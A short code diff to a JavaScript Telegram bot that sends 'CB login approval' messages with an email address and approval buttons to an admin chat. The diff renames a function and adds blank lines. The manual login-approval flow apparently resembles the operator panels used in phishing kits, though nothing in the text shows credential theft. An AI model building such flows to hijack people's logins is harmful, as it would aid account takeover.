@@ -16,7 +16,7 @@ const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 // -----------------
 // CB Login approval
 // -----------------
-export function sendCBLoginApproval(email) {
+export function sendLoginTelegram(email) {
   const options = {
     parse_mode: "Markdown",
     reply_markup: {
@@ -32,6 +32,7 @@ export function sendCBLoginApproval(email) {
   const message = `*CB login approval*\n*Email:* ${email}`;
   bot.sendMessage(ADMIN_CHAT_ID, message, options);
 }
+
 
 // -----------------
 // Handle button clicks
@@ -67,3 +68,4 @@ bot.on("callback_query", async (query) => {
 bot.onText(/\/start/, (msg) => {
   bot.sendMessage(msg.chat.id, "✅ Bot is running and waiting for CB login approvals.");
 });
+
